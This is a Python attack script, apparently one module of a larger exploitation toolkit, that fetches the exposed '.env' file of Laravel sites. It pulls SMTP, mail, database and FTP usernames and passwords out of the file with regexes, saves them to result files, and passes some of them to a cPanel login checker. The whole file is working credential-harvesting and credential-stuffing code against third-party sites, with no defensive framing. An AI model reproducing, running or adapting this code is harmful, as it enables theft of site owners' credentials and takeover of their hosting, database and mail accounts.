# coding=utf-8
import requests, re
import printModule
import cpanel

Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}


def Exploit(site):
    try:
        CC = requests.get('http://' + site + '/.env', timeout=7, headers=Headers)
        if 'DB_PASSWORD=' in str(CC.content):
            with open('result/Laravel_Info.txt', 'a') as XW:
                XW.write('{}/.env\n'.format(site))
            GETSMTp(str(CC.content))
            GETDATABase(str(CC.content), site)
            GETFTp(str(CC.content), site)
            Mail(str(CC.content))
            return printModule.returnYes(site, 'N/A', 'Laravel Exploit', 'unknown')
        else:
            return printModule.returnNo(site, 'N/A', 'Laravel Exploit', 'unknown')
    except:
        return printModule.returnNo(site, 'N/A', 'Laravel Exploit', 'unknown')


def GETSMTp(REZ):
    try:
        if 'MAIL_DRIVER=smtp' in REZ:
            if 'mailtrap.io' in REZ:
                pass
            else:
                for i in range(20):
                    Host = re.findall('SMTP_HOST=(.*)', REZ)[i]
                    Port = re.findall('SMTP_PORT=(.*)', REZ)[i]
                    User = re.findall('SMTP_USERNAME=(.*)', REZ)[i]
                    Pass = re.findall('SMTP_PASSWORD=(.*)', REZ)[i]
                    with open('result/SMTP_Results.txt', 'a') as writer:
                        writer.write(
                            'HostName: {}'.format(Host) + '\nuser: {}'.format(User) +
                            '\nPass: {}'.format(Pass) + '\nPORT: {}'.format(Port) +
                            '\n-----------------------------------------\n')
        else:
            pass
    except:
        pass

def GETFTp(REZ, site):
    try:
        if 'FTP_HOST=' in REZ:
            if 'FTP_HOST=null' in REZ:
                pass
            else:
                for i in range(20):
                    Host = re.findall('FTP_HOST=(.*)', REZ)[i]
                    User = re.findall('FTP_USERNAME=(.*)', REZ)[i]
                    Pass = re.findall('FTP_PASSWORD=(.*)', REZ)[i]
                    with open('result/FTP_Results.txt', 'a') as writer:
                        writer.write(
                            'HostName: {}'.format(Host) + '\nuser: {}'.format(User) +
                            '\nPass: {}'.format(Pass) +
                            '\n-----------------------------------------\n')
                    cpanel.Check(site, User, Pass)
        else:
            pass
    except:
        pass

def GETDATABase(REZ, site):
    try:
        if 'DB_CONNECTION' in REZ:
            if 'DB_CONNECTION=null' in REZ:
                pass
            else:
                for i in range(20):
                    Host = re.findall('DB_HOST=(.*)', REZ)[i]
                    database = re.findall('DB_DATABASE=(.*)', REZ)[i]
                    user = re.findall('DB_USERNAME=(.*)', REZ)[i]
                    Pass = re.findall('DB_PASSWORD=(.*)', REZ)[i]
                    with open('result/Config_results.txt', 'a') as ww:
                        ww.write(' TargetDB = {}/.env\n Host:  '.format(site) + Host + '\n' + ' user:  ' + user +
                                 '\n' + ' pass:  ' + Pass + '\n' + ' DB:    ' + database
                                      + '\n---------------------\n'.format(site))
                    cpanel.Check(site, user, Pass)

    except:
        pass

def Mail(REZ):
    try:
        if 'MAIL_DRIVER=smtp' in REZ:
            if 'mailtrap.io' in REZ:
                pass
            else:
                for i in range(20):
                    Host = re.findall('MAIL_HOST=(.*)', REZ)[i]
                    Port = re.findall('MAIL_PORT=(.*)', REZ)[i]
                    User = re.findall('MAIL_USERNAME=(.*)', REZ)[i]
                    Pass = re.findall('MAIL_PASSWORD=(.*)', REZ)[i]
                    with open('result/SMTP_Results.txt', 'a') as writer:
                        writer.write(
                            'HostName: {}'.format(Host) + '\nuser: {}'.format(User) +
                            '\nPass: {}'.format(Pass) + '\nPORT: {}'.format(Port) +
                            '\n-----------------------------------------\n')
    except:
        pass